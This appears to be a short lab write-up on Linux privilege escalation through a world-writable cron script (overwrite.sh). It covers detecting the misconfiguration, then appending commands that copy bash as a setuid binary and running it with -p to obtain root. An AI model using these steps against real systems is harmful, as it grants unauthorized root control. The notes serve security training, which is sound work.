## Detection

**Linux VM**

1. Check the cron jobs:
   ```bash
   cat /etc/crontab
   ```

![[Pasted image 20240918110712.png]]

2. Note the script `overwrite.sh`.


3. Check the file permissions:
   ```bash
   ls -l /usr/local/bin/overwrite.sh
   ```


4. Note the file permissions.
-rwxr--rw-
- `-`: This indicates that it is a regular file (if it were a directory, this would be `d`).
- `rwx`: The owner (user) has read (`r`), write (`w`), and execute (`x`) permissions.
- `r--`: The group has read (`r`) permission only.
- `rw-`: Others (world) have read (`r`) and write (`w`) permissions, but no execute (`-`) permission.
## Exploitation

**Linux VM**

1. Append a command to the script:
   ```bash
   echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
   ```

2. Wait 1 minute for the script to execute.

3. Run the new Bash binary:
   ```bash
   /tmp/bash -p
   ```

4. Check your user ID:
   ```bash
   id
   ```
